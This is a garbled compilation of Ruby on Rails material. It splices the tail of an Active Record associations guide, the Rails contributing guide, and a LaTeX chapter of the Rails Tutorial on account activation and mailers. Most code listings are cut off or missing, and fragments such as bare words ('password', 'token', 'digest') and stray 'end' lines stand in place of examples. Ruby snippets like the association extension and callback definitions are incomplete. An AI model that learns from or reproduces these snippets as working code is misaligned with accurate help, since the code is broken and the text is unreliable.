If the parent object (the one declaring the `has_and_belongs_to_many` association) is unsaved (that is, `new_record?` returns `true`) then the child objects are not saved when they are added. 
If you want to assign an object to a `has_and_belongs_to_many` association without saving the object, use the `collection.build` method.
### Association Callbacks
Normal callbacks hook into the life cycle of Active Record objects, allowing you to work with those objects at various points. 
For example, you can use a `:before_save` callback to cause something to happen just before an object is saved.
Association callbacks are similar to normal callbacks, but they are triggered by events in the life cycle of a collection. 
There are four available association callbacks:
* `before_add`
* `after_add`
* `before_remove`
* `after_remove`
You define association callbacks by adding options to the association declaration. 
  has_many :orders, before_add: :check_credit_limit
  def check_credit_limit(order)
Rails passes the object being added or removed to the callback.
You can stack callbacks on a single event by passing them as an array:
  has_many :orders,
    before_add: [:check_credit_limit, :calculate_shipping_charges]
  def calculate_shipping_charges(order)
If a `before_add` callback throws an exception, the object does not get added to the collection. 
Similarly, if a `before_remove` callback throws an exception, the object does not get removed from the collection.
### Association Extensions
You're not limited to the functionality that Rails automatically builds into association proxy objects. 
You can also extend these objects through anonymous modules, adding new finders, creators, or other methods. 
  has_many :orders do
    def find_by_order_prefix(order_number)
      find_by(region_id: order_number[0..2])
If you have an extension that should be shared by many associations, you can use a named extension module. 
module FindRecentExtension
  def find_recent
    where("created_at > ?", 5.days.ago)
  has_many :orders, -> { extending FindRecentExtension }
  has_many :deliveries, -> { extending FindRecentExtension }
Extensions can refer to the internals of the association proxy using these three attributes of the `proxy_association` accessor:
* `proxy_association.owner` returns the object that the association is a part of.
* `proxy_association.reflection` returns the reflection object that describes the association.
* `proxy_association.target` returns the associated object for `belongs_to` or `has_one`, or the collection of associated objects for `has_many` or `has_and_belongs_to_many`.
Go<n>ahead and run the migration:
Contributing to Ruby on Rails
This guide covers ways in which _you_ can become a part of the ongoing development of Ruby on Rails.
* How to use GitHub to report issues.
* How to clone master and run the test suite.
* How to help resolve existing issues.
* How to contribute to the Ruby on Rails documentation.
* How to contribute to the Ruby on Rails code.
Ruby on Rails is not "someone else's framework." 
Over the years, hundreds of people have contributed to Ruby on Rails ranging from a single character to massive architectural changes or significant documentation - all with the goal of making Ruby on Rails better for everyone. 
Even if you don't feel up to writing code or documentation yet, there are a variety of other ways that you can contribute, from reporting issues to testing patches.
Reporting an Issue
Ruby on Rails uses [GitHub Issue Tracking](https://github.com/rails/rails/issues) to track issues (primarily bugs and contributions of new code). 
If you've found a bug in Ruby on Rails, this is the place to start. 
You'll need to create a (free) GitHub account in order to submit an issue, to comment on them or to create pull requests.
NOTE: Bugs in the most recent released version of Ruby on Rails are likely to get the most attention. 
Also, the Rails core team is always interested in feedback from those who can take the time to test _edge Rails_ (the code for the version of Rails that is currently under development). 
Later in this guide you'll find out how to get edge Rails for testing.
### Creating a Bug Report
<n><n>If you've found a problem in Ruby on Rails which is not a security risk, do a search in GitHub under [Issues](https://github.com/rails/rails/issues) in case it has already been reported. If you do not find any issue addressing it you may proceed to [open a new one](https://github.com/rails/rails/issues/new). 
(See the next section for reporting security issues.)
Your issue report should contain a title and a clear description of the issue at the bare minimum. 
You should include as much relevant information as possible and should at least post a code sample that demonstrates the issue. 
It would be even better if you could include a unit test that shows how the expected behavior is not occurring. 
Your goal should be to make it easy for yourself - and others - to replicate the bug and figure out a fix.
Then, don't get your hopes up! 
Unless you have a "Code Red, Mission Critical, the World is Coming to an End" kind of bug, you're creating this issue report in the hope that others with the same problem will be able to collaborate with you on solving it. 
Do not expect that the issue report will automatically see any activity or that others will jump to fix it. 
Creating an issue like this is mostly to help yourself start on the path of fixing the problem and for others to confirm it with an "I'm having this problem too" comment.
### Special Treatment for Security Issues
WARNING: Please do not report security vulnerabilities with public GitHub issue reports. 
The [Rails security policy page](http://rubyonrails.org/security) details the procedure to follow for security issues.
### What about Feature Requests?
Please don't put "feature request" items into GitHub Issues. 
If there's a new<n>feature that you want to see added to Ruby on Rails, you'll need to write the<n>code yourself - or convince someone else to partner with you to write the code.<n>
Later in this guide you'll find detailed instructions for proposing a patch to<n>Ruby on Rails. 
If you enter a wish list item in GitHub Issues with no code, you<n>can expect it to be marked "invalid" as soon as it's reviewed.
Sometimes, the line between 'bug' and 'feature' is a hard one to draw.<n>
Generally, a feature is anything that adds new behavior, while a bug is<n>anything that fixes already existing behavior that is misbehaving. 
Sometimes,<n>the core team will have to make a judgement call. 
That said, the distinction<n>generally just affects which release your patch will get in to; we love feature<n>submissions! 
They just won't get backported to maintenance branches.
If you'd like feedback on an idea for a feature before doing the work for make<n>a patch, please send an email to the [rails-core mailing<n>list](https://groups.google.com/forum/?fromgroups#!forum/rubyonrails-core). You<n>might get no response, which means that everyone is indifferent. 
You might find<n>someone who's also interested in building that feature. 
You might get a "This<n>won't be accepted." 
But it's the proper place to discuss new ideas. 
GitHub<n>Issues are not a particularly good venue for the sometimes long and involved<n>discussions new features require.
Helping to Resolve Existing Issues
----------------------------------
As a next step beyond reporting issues, you can help the core team resolve existing issues. 
If you check the [Everyone's Issues](https://github.com/rails/rails/issues) list in GitHub Issues, you'll find lots of issues already requiring attention. 
What can you do for these? 
Quite a bit, actually:
### Verifying Bug Reports
For starters, it helps just to verify bug reports. 
Can you reproduce the reported issue on your own computer? 
If so, you can add a comment to the issue saying that you're seeing the same thing.
If something is very vague, can you help squash it down into something specific? 
Maybe you can provide additional information to help reproduce a bug, or help by eliminating needless steps that aren't required to demonstrate the problem.
If you find a bug report without a test, it's very useful to contribute a failing test. 
This is also a great way to get started exploring the source code: looking at the existing test files will teach you how to write more tests. 
New tests are best contributed in the form of a patch, as explained later on in the "Contributing to the Rails Code" section.
Anything you can do to make bug reports more succinct or easier to reproduce is a help to folks trying to write code to fix those bugs - whether you end up writing the code yourself or not.
### Testing Patches
You can also help out by examining pull requests that have been submitted to Ruby on Rails via GitHub. 
To apply someone's changes you need first to create a dedicated branch:
$ git checkout -b testing_branch
Then you can use their remote branch to update your codebase. 
For example, let's say the GitHub user JohnSmith has forked and pushed to a topic branch "orange" located at https://github.com/JohnSmith/rails.
$ git remote add JohnSmith git://github.com/JohnSmith/rails.git
$ git pull JohnSmith orange
After applying their branch, test it out! 
Here are some things to think about:
* Does the change actually work?
* Are you happy with the tests? 
Can you follow what they're testing? 
Are there any tests missing?
* Does it have the proper documentation coverage? 
Should documentation elsewhere be updated?
* Do you like the implementation? 
Can you think of a nicer or faster way to implement a part of their change?
Once you're happy that the pull request contains a good change, comment on the GitHub issue indicating your approval. 
Your comment should indicate that you like the change and what you like about it. 
Something like:
>I like the way you've restructured that code in generate_finder_sql - much nicer. 
The tests look good too.
If your comment simply says "+1", then odds are that other reviewers aren't going to take it too seriously. 
Show that you took the time to review the pull request.
Contributing to the Rails Documentation
---------------------------------------
Ruby on Rails has two main sets of documentation: the guides, which help you<n>learn about Ruby on Rails, and the API, which serves as a reference.
You can help improve the Rails guides by making them more coherent, consistent or readable, adding missing information, correcting factual errors, fixing typos, or bringing it up to date with the latest edge Rails. 
You can either open a pull request to [Rails](http://github.com/rails/rails) or<n>ask the [Rails core team](http://rubyonrails.org/core) for commit access on
Please do not open pull requests in docrails, if you'd like to get feedback on your<n>change, ask for it in [Rails](http://github.com/rails/rails) instead.
Docrails is merged with master regularly, so you are effectively editing the Ruby on Rails documentation.
If you are unsure of the documentation changes, you can create an issue in the [Rails](https://github.com/rails/rails/issues) issues tracker on GitHub.
When working with documentation, please take into account the [API Documentation Guidelines](api_documentation_guidelines.html) and the [Ruby on Rails Guides Guidelines](ruby_on_rails_guides_guidelines.html).
NOTE: As explained earlier, ordinary code patches should have proper documentation coverage. 
Docrails is only used for isolated documentation improvements.
NOTE: To help our CI servers you should add [ci skip] to your documentation commit message to skip build on that commit. 
Please remember to use it for commits containing only documentation changes.
WARNING: Docrails has a very strict policy: no code can be touched whatsoever, no matter how trivial or small the change. 
Only RDoc and guides can be edited via docrails. 
Also, CHANGELOGs should never be edited in docrails.
Contributing to the Rails Code
### Setting Up a Development Environment
To move on from submitting bugs to helping resolve existing issues or contributing your own code to Ruby on Rails, you _must_ be able to run its test suite. 
In this section of the guide you'll learn how to setup the tests on your own computer.
#### The Easy Way
The easiest and recommended way to get a development environment ready to hack is to use the [Rails development box](https://github.com/rails/rails-dev-box).
#### The Hard Way
In case you can't use the Rails development box, see [this other guide](development_dependencies_install.html).
### Clone the Rails Repository
To be able to contribute code, you need to clone the Rails repository:
$ git clone git://github.com/rails/rails.git
and create a dedicated branch:
$ cd rails
$ git checkout -b my_new_branch
It doesn't matter much what name you use, because this branch will only exist on your local computer and your personal repository on GitHub. 
It won't be part of the Rails Git repository.
### Running an Application Against Your Local Branch
In case you need a dummy Rails app to test changes, the `--dev` flag of `rails new` generates an application that uses your local branch:
$ bundle exec rails new ~/my-test-app --dev
The application generated in `~/my-test-app` runs against your local branch<n>and in particular sees any modifications upon server reboot.
### Write Your Code
Now get busy and add/edit code. 
You're on your branch now, so you can write whatever you want (make sure you're on the right branch with `git branch -a`). 
But if you're planning to submit your change back for inclusion in Rails, keep a few things in mind:
* Get the code right.
* Use Rails idioms and helpers.
* Include tests that fail without your code, and pass with it.
* Update the (surrounding) documentation, examples elsewhere, and the guides: whatever is affected by your contribution.
TIP: Changes that are cosmetic in nature and do not add anything substantial to the stability, functionality, or testability of Rails will generally not be accepted (read more about [our rationales behind this decision](https://github.com/rails/rails/pull/13771#issuecomment-32746700)).
#### Follow the Coding Conventions
Rails follows a simple set of coding style conventions:
* Two spaces, no tabs (for indentation).
* No trailing whitespace. 
Blank lines should not have any spaces.
* Indent after private/protected.
* Use Ruby >= 1.9 syntax for hashes. 
Prefer `{ a: :b }` over `{ :a => :b }`.
* Prefer `&&`/`||` over `and`/`or`.
* Prefer class << self over self.method for class methods.
* Use `a = b` and not `a=b`.
* Use assert_not methods instead of refute.
* Prefer `method { do_stuff }` instead of `method{do_stuff}` for single-line blocks.
* Follow the conventions in the source you see used already.
The above are guidelines - please use your best judgment in using them.
### Benchmark Your Code
If your change has an impact on the performance of Rails, please use the<n>[benchmark-ips](https://github.com/evanphx/benchmark-ips) gem to provide<n>benchmark results for comparison.
Here's an example of using benchmark-ips:
Please see the benchmark/ips [README](https://github.com/evanphx/benchmark-ips/blob/master/README.md) for more information.
### Running Tests
It is not customary in Rails to run the full test suite before pushing<n>changes. 
The railties test suite in particular takes a long time, and even<n>more if the source code is mounted in `/vagrant` as happens in the recommended<n>workflow with the [rails-dev-box](https://github.com/rails/rails-dev-box).
As a compromise, test what your code obviously affects, and if the change is<n>not in railties, run the whole test suite of the affected component. 
If all<n>tests are passing, that's enough to propose your contribution. 
We have<n>[Travis CI](https://travis-ci.org/rails/rails) as a safety net for catching<n>unexpected breakages elsewhere.
#### Entire Rails:
To run all the tests, do:
$ bundle exec rake test
#### For a Particular Component
You can run tests only for a particular component (e.g. Action Pack). 
For example,<n>to run Action Mailer tests:
$ cd actionmailer
#### Running a Single Test
You can run a single test through ruby. 
For instance:
The `-n` option allows you to run a single method instead of the whole
#### Testing Active Record
This is how you run the Active Record test suite only for SQLite3:
$ cd activerecord
$ bundle exec rake test:sqlite3
You can now run the tests as you did for `sqlite3`. 
The tasks are respectively
test:mysql
test:mysql2
test:postgresql
Finally,
will now run the four of them in turn.
You can also run any single test separately:
$ ARCONN=sqlite3 ruby -Itest test/cases/associations/has_many_associations_test.rb
To run a single test against all adapters, use:
$ bundle exec rake TEST=test/cases/associations/has_many_associations_test.rb
You can invoke `test_jdbcmysql`, `test_jdbcsqlite3` or `test_jdbcpostgresql` also. 
See the file `activerecord/RUNNING_UNIT_TESTS.rdoc` for information on running more targeted database tests, or the file `ci/travis.rb` for the test suite run by the continuous integration server.
### Warnings
The test suite runs with warnings enabled. 
Ideally, Ruby on Rails should issue no warnings, but there may be a few, as well as some from third-party libraries. 
Please ignore (or fix!) them, if any, and submit patches that do not issue new warnings.
If you are sure about what you are doing and would like to have a more clear output, there's a way to override the flag:
$ RUBYOPT=-W0 bundle exec rake test
### Updating the CHANGELOG
The CHANGELOG is an important part of every release. 
It keeps the list of changes for every Rails version.
Refactorings and documentation changes generally should not go to the CHANGELOG.
You can use multiple lines if you need more space and you can attach code examples indented with 4 spaces. 
If a change is related to a specific issue, you should attach the issue's number. 
Here is an example CHANGELOG entry:
*   Summary of a change that briefly describes what was changed. 
You can use multiple
    lines and wrap them at around 80 characters. 
Code examples are ok, too, if needed:
        class Foo
          def bar
            puts 'baz'
          end
        end
    You can continue after the code example and you can attach issue number. 
GH#1234
    *Your Name*
### Updating the Gemfile.lock
In these cases make sure you run `bundle update` to get the right version of the dependency and commit the `Gemfile.lock` file within your changes.
### Sanity Check
You should not be the only person who looks at the code before you submit it.<n>
If you know someone else who uses Rails, try asking them if they'll check out<n>your work. 
If you don't know anyone else using Rails, try hopping into the IRC<n>room or posting about your idea to the rails-core mailing list. 
### Commit Your Changes
When you're happy with the code on your computer, you need to commit the changes to Git:
$ git commit -a
Short summary (ideally 50 characters or less)
More detailed description, if necessary. 
It should be wrapped to 72<n>characters. 
    class ArticlesController
      def index
You can also add bullet points:
TIP. Please squash your commits into a single commit when appropriate. 
### Update Your Branch
It's pretty likely that other changes to master have happened while you were working. 
Go get them:
$ git checkout master
$ git pull --rebase
Now reapply your patch on top of the latest changes:
$ git checkout my_new_branch
$ git rebase master
No conflicts? 
Tests still pass? 
Change still seems reasonable to you? 
Then move on.
### Fork
Navigate to the Rails [GitHub repository](https://github.com/rails/rails) and press "Fork" in the upper right hand corner.
Add the new remote to your local repository on your local machine:
$ git remote add mine git@github.com:<your user name>/rails.git
Push to your remote:
$ git push mine my_new_branch
You might have cloned your forked repository into your machine and might want to add the original Rails repository as a remote instead, if that's the case here's what you have to do.
In the directory you cloned your fork:
$ git remote add rails git://github.com/rails/rails.git
Download new commits and branches from the official repository:
$ git fetch rails
Merge the new content:
$ git rebase rails/master
Update your fork:
$ git push origin master
If you want to update another branch:
$ git checkout branch_name
$ git rebase rails/branch_name
$ git push origin branch_name
### Issue a Pull Request
Navigate to the Rails repository you just pushed to (e.g.<n>https://github.com/your-user-name/rails) and click on "Pull Requests" seen in<n>the right panel. 
On the next page, press "New pull request" in the upper right<n>hand corner.
Click on "Edit", if you need to change the branches being compared (it compares<n>"master" by default) and press "Click to create a pull request for this<n>comparison".
Ensure the changesets you introduced are included. 
Fill in some details about<n>your potential patch including a meaningful title. 
When finished, press "Send<n>pull request". 
The Rails core team will be notified about your submission.
### Get some Feedback
Most pull requests will go through a few iterations before they get merged.<n>
Different contributors will sometimes have different opinions, and often<n>patches will need revised before they can get merged.
Some contributors to Rails have email notifications from GitHub turned on, but<n>others do not. 
Furthermore, (almost) everyone who works on Rails is a<n>volunteer, and so it may take a few days for you to get your first feedback on<n>a pull request. Don't despair! 
Sometimes it's quick, sometimes it's slow. 
Such<n>is the open source life.
If it's been over a week, and you haven't heard anything, you might want to try<n>and nudge things along. 
You can use the [rubyonrails-core mailing<n>list](http://groups.google.com/group/rubyonrails-core/) for this. 
You can also<n>leave another comment on the pull request.
While you're waiting for feedback on your pull request, open up a few other<n>pull requests and give someone else some! 
I'm sure they'll appreciate it in<n>the same way that you appreciate feedback on your patches.
### Iterate as Necessary
It's entirely possible that the feedback you get will suggest changes. 
Don't get discouraged: the whole point of contributing to an active open source project is to tap into the knowledge of the community. 
If people are encouraging you to tweak your code, then it's worth making the tweaks and resubmitting. 
If the feedback is that your code doesn't belong in the core, you might still think about releasing it as a gem.
#### Squashing commits
One of the things that we may ask you to do is to "squash your commits", which<n>will combine all of your commits into a single commit. 
We prefer pull requests<n>that are a single commit. 
This makes it easier to backport changes to stable<n>branches, squashing makes it easier to revert bad commits, and the git history<n>can be a bit easier to follow. 
Rails is a large project, and a bunch of<n>extraneous commits can add a lot of noise.
In order to do this, you'll need to have a git remote that points at the main<n>Rails repository. 
This is useful anyway, but just in case you don't have it set<n>up, make sure that you do this first:
$ git remote add upstream https://github.com/rails/rails.git
You can call this remote whatever you'd like, but if you don't use `upstream`,<n>then change the name to your own in the instructions below.
Given that your remote branch is called `my_pull_request`, then you can do the<n>following:
$ git fetch upstream
$ git checkout my_pull_request
$ git rebase upstream/master
$ git rebase -i
< Choose 'squash' for all of your commits except the first one. >
< Edit the commit message to make sense, and describe all your changes. >
$ git push origin my_pull_request -f
You should be able to refresh the pull request on GitHub and see that it has<n>been updated.
#### Updating pull request
Sometimes you will be asked to make some changes to the code you have<n>already committed. 
This can include amending existing commits. 
In this<n>case Git will not allow you to push the changes as the pushed branch<n>and local branch do not match. 
Instead of opening a new pull request,<n>you can force push to your branch on GitHub as described earlier in<n>squashing commits section:
This will update the branch and pull request on GitHub with your new code. 
Do<n>note that using force push may result in commits being lost on the remote branch; use it with care.
### Older Versions of Ruby on Rails
If you want to add a fix to older versions of Ruby on Rails, you'll need to set up and switch to your own local tracking branch. 
Here is an example to switch to the 4-0-stable branch:
$ git branch --track 4-0-stable origin/4-0-stable
$ git checkout 4-0-stable
TIP: You may want to [put your Git branch name in your shell prompt](http://qugstart.com/blog/git-and-svn/add-colored-git-branch-name-to-your-shell-prompt/) to make it easier to remember which version of the code you're working with.
#### Backporting
Changes that are merged into master are intended for the next major release of Rails. 
Sometimes, it might be beneficial for your changes to propagate back to the maintenance releases for older stable branches. 
Generally, security fixes and bug fixes are good candidates for a backport, while new features and patches that introduce a change in behavior will not be accepted. 
When in doubt, it is best to consult a Rails team member before backporting your changes to avoid wasted effort.
For simple fixes, the easiest way to backport your changes is to [extract a diff from your changes in master and apply them to the target branch](http://ariejan.net/2009/10/26/how-to-create-and-apply-a-patch-with-git).
First make sure your changes are the only difference between your current branch and master:
$ git log master..
Then extract the diff:
$ git format-patch master --stdout > ~/my_changes.patch
Switch over to the target branch and apply your changes:
$ git checkout -b my_backport_branch 3-2-stable
$ git apply ~/my_changes.patch
This works well for simple changes. 
However, if your changes are complicated or if the code in master has deviated significantly from your target branch, it might require more work on your part. 
The difficulty of a backport varies greatly from case to case, and sometimes it is simply not worth the effort.
Once you have resolved all conflicts and made sure all the tests are passing, push your changes and open a separate pull request for your backport. 
It is also worth noting that older branches might have a different set of build targets than master. 
When possible, it is best to first test your backport locally against the Ruby versions listed in `.travis.yml` before submitting your pull request.
Rails Contributors
All contributions, either via master or docrails, get credit in [Rails Contributors](http://contributors.rubyonrails.org).
You can help improve the Rails guides by making them more coherent, consistent or readable, adding missing information, correcting factual errors, fixing typos, or bringing it up to date with the latest edge Rails.<n><n>
    class Application < Rails::Application
\href{http://www.michaelhartl.com/}{Michael Hartl} is the author of the \href{http://www.railstutorial.org/}{\emph{Ruby on Rails Tutorial}}, one of the leading introductions to web development, and is a cofounder of the \href{http://www.softcover.io/}{Softcover} self-publishing platform.
His prior experience includes writing and developing \emph{RailsSpace}, an extremely obsolete Rails tutorial book, and developing Insoshi, a once-popular and now-obsolete social networking platform in Ruby on Rails.
In 2011, Michael received a \href{http://rubyheroes.com/heroes}{Ruby Hero Award} for his contributions to the Ruby community.
He is a graduate of \href{http://college.harvard.edu/}{Harvard College}, has a \href{http://resolver.caltech.edu/CaltechETD:etd-05222003-161626}{Ph.D. in Physics} from \href{http://www.caltech.edu/}{Caltech}, and is an alumnus of the \href{http://ycombinator.com/}{Y~Combinator} entrepreneur program.
In Chapter~\ref{cha:updating_showing_and_deleting_users}, we finished making a basic Users resource (filling in all the standard REST actions from Table~\ref{table:RESTful_users}), together with a flexible authentication and authorization system.
In this chapter, we'll put the finishing touches on this system by adding two closely related features: account activation (which verifies a new user's email address) and password reset (for users who forget their passwords).
Each of these two features will involve creating a new resource, thereby giving us a chance to see further examples of controllers, routing, and database migrations.
In the process, we'll also have a chance to learn how to send email in Rails, both in development and in production.
Finally, the two features complement each other nicely: password resets involve sending a reset link to a user's email address, the validity of which is confirmed by the initial account activation
.\footnote{
Technically, a user could update their account with an erroneous email address using the account settings update feature from Section~\ref{sec:updating_users}, but the current implementation gets us most of the benefit of email verification without too much work.
}<n><n>\section{Account activation} % (fold)<n>\label{sec:account_activation}<n><n>
At present, newly registered users immediately have full access to their accounts (Chapter~\ref{cha:sign_up}).
In this section, we'll implement an account activation step to verify that the user controls the email address they used to sign up.
This will involve associating an activation token and digest with a user, sending the user an email with a link including the token, and activating the user upon clicking the link.
Our strategy for handling account activation parallels user login \linebreak (Section~\ref{sec:logging_in}) and especially remembering users (Section~\ref{sec:remember_me}).
The basic sequence appears as follows:
Start users in an ``unactivated'' state.
When a user signs up, generate an activation token and corresponding activation digest.
Save the activation digest to the database, and then send an email to the user with a link containing the activation token and user's email address
We could use the user's id instead, since it's already exposed in the URLs of our application, but using email addresses is more future-proof in case we want to obfuscate user ids for any reason (such as to prevent competitors from knowing how many users our application has, for example).
When the user clicks the link, find the user by email address, and then authenticate the token by comparing with the activation digest.
If the user is authenticated, change the status from ``unactivated'' to ``activated''.
Because of the similarity with passwords and remember tokens, we will be able to reuse many of the same ideas for account activation (as well as password reset), including the \kode{User.digest} and \kode{User.new\_token} methods and a modified version of the \kode{user.authenticated?}\ method.
Table~\ref{table:password_token_digest} illustrates the analogy (including the password reset from Section~\ref{sec:password_reset}).
We'll define the generalized version of the \kode{authenticated?}\ method from Table~\ref{table:password_token_digest} in Section~\ref{sec:activating_the_account}.
find~by
authenticated?(:remember, token)
authenticated?(:activation, token)
authenticated?(:reset, token)
The analogy between login, remembering, account activation, and password reset.
As usual, we'll make a topic branch for the new feature.
As we'll see in Section~\ref{sec:email_in_production}, account activation and password reset include some common email configuration, which we'll want to apply to both features before merging to master.
As a result, it's convenient to use a common topic branch:
master
As with sessions (Section~\ref{sec:sessions_and_failed_login}), we'll model account activations as a resource even though they won't be associated with an Active Record model.
Instead, we'll include the relevant data (including the activation token and activation status) in the User model.
It might even make more sense to use an \kode{update} action, but the activation link needs to be sent in an email and hence should involve a regular browser click, which issues a \texttt{GET} request instead of the \texttt{PATCH} request required by the \kode{update} action.
This
Because we'll be using an \kode{edit} action, we could include \kode{edit} on the command line, but this would also generate both an edit view and a test, neither of which we'll turn out to need.
$ rails generate
--no-test-framework
Note that we've included a flag to skip generating tests.
This is because we don't need the controller tests (preferring instead to use an integration test (Section~\ref{sec:activation_test_and_refactoring})), so it's convenient to omit them.
The activation email will involve a URL of the form
which means we'll need a named route for the \kode{edit} action.
We can arrange this with the \kode{resources} line shown in Listing~\ref{code:account_activations_route}.
Adding a resource for account activations.
Next, we need a unique activation token to activate users.
password
token
For example, an attacker with access to the database could immediately activate newly created accounts, thereby logging in as the user, and could then change the password to gain control.
following
digest
This way we can access the activation token using
and authenticate the user with code like
(This will require a modification of the \kode{authenticated?}\ method defined in Listing~\ref{code:authenticated_p}.)
We'll also add a boolean attribute \kode{activated}, which will allow us to test if a user is activated using the same kind of auto-generated boolean method we saw in Section~\ref{sec:administrative_users}:
Finally, although we won't use it in this tutorial, we'll record the time and date of the activation in case we want it for future reference.
The full data model appears in Figure~\ref{fig:user_model_account_activation}.
The User model with added account activation attributes.
The migration to add the data model from Figure~\ref{fig:user_model_account_activation} adds all three attributes at the command line:
As with the \kode{admin} attribute (Listing~\ref{code:admin_migration}), we'll add a default boolean value of \kode{false} to the \kode{activated} attribute, as shown in in Listing~\ref{code:add_activation_to_users_migration}.
A migration for account activation (with added index).
<n>  end
We then apply the migration as usual:
$ bundle exec rake db:migrate
Because every newly signed-up user will require activation, we should assign an activation token and digest to each user object before it's created.
We saw a similar idea in Section~\ref{sec:uniqueness_validation}, where we needed to convert an email address to lower-case before saving a user to the database.
In that case, we used a \kode{before\_save} callback combined with the \kode{downcase} method (Listing~\ref{code:email_downcase}).
A \kode{before\_save} callback is automatically called before the object is saved, which includes both object creation and updates, but in the case of the activation digest we only want the callback to fire when the user is created.
This requires a \kode{before\_create} callback, which we'll define as follows:
This code, called a \emph{method reference}, arranges for Rails to look for a method called \kode{create\_activation\_digest} and run it before creating the user.
(In Listing~\ref{code:email_downcase}, we passed \kode{before\_save} an explicit block, but the method reference technique is generally preferred.)
private
All methods defined in a class after \kode{private} are automatically hidden, as seen in this console session:
$ rails console
The purpose of the \kode{before\_create} callback is to assign the token and corresponding digest, which we can accomplish as follows:
This code simply reuses the token and digest methods used for the remember token, as we can see by comparing with the \kode{remember} method from Listing~\ref{code:user_model_remember}:
# Remembers a user in the database for use in persistent sessions.
The main difference is the use of \kode{update\_attribute} in the latter case.
The reason for the difference is that remember tokens and digests are created for users that already exist in the database, whereas the \kode{before\_create} callback happens \emph{before} the user has been created.
As a result of the callback, when a new user is defined with \kode{User.new} (as in user signup, Listing~\ref{code:create_action_strong_parameters}), it will automatically get both \kode{activation\_token} and \kode{activation\_digest} attributes; because the latter is associated with a column in the database (Figure~\ref{fig:user_model_account_activation}), it will be written automatically when the user is saved.
Putting together the discussion above yields the User model shown in Listing~\ref{code:user_model_activation_code}.
As required by the virtual nature of the activation token, we've added a second \kode{attr\_accessor} to our model.
Note that we've taken the opportunity to use a method reference for email downcasing as well.
Adding account activation code to the User model. 
email
<n>    end
Before moving on, we should also update our seed data and fixtures so that our sample and test users are initially activated, as shown in Listing~\ref{code:seed_users_activated} and Listing~\ref{code:fixture_users_activated}.
(The \kode{Time.zone.now} method is a built-in Rails helper that returns the current timestamp, taking into account the time zone on the server.)
Activating seed users by default.
Activating fixture users.
Example
To apply the changes in Listing~\ref{code:seed_users_activated}, reset the database to reseed the data as usual:
$ bundle exec rake db:migrate:reset<n>$ bundle exec rake db:seed
With the data modeling complete, we're now ready to add the code needed to send an account activation email.
The method is to add a User \emph{mailer} using the Action Mailer library, which we'll use in the Users controller \kode{create} action to send an email with an activation link.
Mailers are structured much like controller actions, with email templates defined as views.
Our task in this section is to define the mailers and views with links containing the activation token and email address associated with the account to be activated.
As with models and controllers, we can generate a mailer using \kode{rails generate}:
Here we've generated the necessary \kode{account\_activation} method as well as the \kode{password\_reset} method we'll need in Section~\ref{sec:password_reset}.
As part of generating the mailer, Rails also generates two view templates for each mailer, one for plain-text email and one for HTML email.
For the account activation mailer method, they appear as in Listing~\ref{code:generated_account_activation_view_text} and Listing~\ref{code:generated_account_activation_view_html}.
The generated account activation text view.
The generated account activation HTML view.
Let's take a look at the generated mailers to get a sense of how they work (Listing~\ref{code:generated_application_mailer} and Listing~\ref{code:generated_user_mailer}).
We see in Listing~\ref{code:generated_application_mailer} that there is a default \kode{from} address common to all mailers in the application, and each method in Listing~\ref{code:generated_user_mailer} has a recipient's address as well.
(Listing~\ref{code:generated_application_mailer} also uses a mailer layout corresponding to the email format; although it won't ever matter in this tutorial, the resulting HTML and plain-text mailer layouts can be found in \kode{app/views/layouts}.)
The generated code also includes an instance variable (\kode{@greeting}), which is available in the mailer views in much the same way that instance variables in controllers are available in ordinary views.
The generated application mailer.
The generated User mailer.
To make a working activation email, we'll first customize the generated template as shown in Listing~\ref{code:application_mailer}.
Next, we'll create an instance variable containing the user (for use in the view), and then mail the result to \kode{user.email} (Listing~\ref{code:mail_account_activation}).
The application mailer with a new default \kode{from} address.
Mailing the account activation link.
As with ordinary views, we can use embedded Ruby to customize the template views, in this case greeting the user by name and including a link to a custom activation link.
Our plan is to find the user by email address and then authenticate the activation token, so the link needs to include both the email and the token.
Because we're modeling activations using an Account Activations resource, the token itself can appear as the argument of the named route defined in Listing~\ref{code:account_activations_route}:
Recalling that
produces a URL of the form
http://www.example.com/users/1/edit
the corresponding account activation link's base URL will look like this:
http://www.example.com/account_activations/q5lt38hQDc_959PVoo6b7A/edit
Here \kode{q5lt38hQDc\_959PVoo6b7A} is a URL-safe base64 string generated by the \kode{new\_token} method (Listing~\ref{code:token_method}), and it plays the same role as the user id in /users/1/edit.
In particular, in the Activations controller \kode{edit} action, the token will be available in the \kode{params} hash as \kode{params[:id]}.
In order to include the email as well, we need to use a \emph{query parameter}, which in a URL appears as a key-value pair located after a question mark
email=foo%40example.com
When using named routes in this way to define query parameters, Rails automatically escapes out any special characters.
The resulting email address will also be unescaped automatically in the controller, and will be available via \kode{params[:email]}.
With the \kode{@user} instance variable as defined in Listing~\ref{code:mail_account_activation}, we can create the necessary links using the named edit route and embedded Ruby, as shown in Listing~\ref{code:account_activation_view_text} and Listing~\ref{code:account_activation_view_html}.
Note that the HTML template in Listing~\ref{code:account_activation_view_html} uses the \kode{link\_to} method to construct a valid link.
The account activation text view.
The account activation HTML view.
To see the results of the templates defined in Listing~\ref{code:account_activation_view_text} and \linebreak Listing~\ref{code:account_activation_view_html}, we can use \emph{email previews}, which are special URLs exposed by Rails to let us see what our email messages look like.
First, we need to add some configuration to our application's development environment, as shown in Listing~\ref{code:development_email_settings}.
Email settings in development.
Listing~\ref{code:development_email_settings} uses a host name of \kode{'example.com'}, but you should use the actual host of your development environment.
For example, on my system either of the following works (depending on whether I'm using the cloud IDE or the local server):
After restarting the development server to activate the configuration in Listing~\ref{code:development_email_settings}, we next need to update the User mailer \emph{preview file}, which was automatically generated in Section~\ref{sec:account_activation_mailer}, as shown in Listing~\ref{code:generated_user_mailer_previews}.
The generated User mailer previews.
<n><n>end
Because the \kode{account\_activation} method defined in Listing~\ref{code:mail_account_activation} requires a valid user object as an argument, the code in Listing~\ref{code:generated_user_mailer_previews} won't work as written.
in Listing~\ref{code:account_activation_view_text} and
(Because \kode{activation\_token} is a virtual attribute (Section~\ref{sec:account_activations_resource}), the user from the database doesn't have one.)
A working preview method for account activation.
With the preview code as in Listing~\ref{code:account_activation_preview}, we can visit the suggested URLs to preview the account activation emails.
The resulting HTML and text emails appear as in Figure~\ref{fig:account_activation_html_preview} and Figure~\ref{fig:account_activation_text_preview}.
A preview of HTML version of the account activation email.
A preview of text version the account activation email.
As a final step, we'll write a couple of tests to double-check the results shown in the email previews.
This isn't as hard as it sounds, because Rails has generated useful example tests for us (Listing~\ref{code:generated_user_mailer_test}).
The User mailer test generated by Rails.
